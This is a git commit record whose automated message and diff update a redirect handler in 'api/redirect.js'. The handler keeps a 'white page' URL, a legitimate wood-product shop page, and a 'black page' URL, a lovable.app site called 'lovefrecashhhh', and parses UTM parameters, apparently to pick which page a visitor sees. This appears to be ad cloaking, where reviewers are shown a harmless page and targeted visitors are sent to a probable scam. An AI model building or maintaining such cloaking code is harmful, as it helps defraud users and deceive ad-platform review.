b109f7d4fe251e6709403609991d50588f257d56
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-24 23:22:48 +0500

    chore: Update lander links (automated)
    White Hat: https://woodnwares.ca/collections/home-decor-1/products/elevate-your-home-decor-with-a-solid-pine-wood-pedestal-riser-canadian-made
    Black Hat: https://lovefrecashhhh.lovable.app/?
    
    Request ID: fEJmPChJJkjiHbgbGhYr
    Allocated to: demo@demo.com
    Auto-release: 2025-11-25T18:22:47.791Z

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://openwood.pk/product/openwood-laptop-stand/";
-    const blackPageURL = "https://mohsinsiraj.lovable.app/";
+    const whitePageURL = "https://woodnwares.ca/collections/home-decor-1/products/elevate-your-home-decor-with-a-solid-pine-wood-pedestal-riser-canadian-made";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
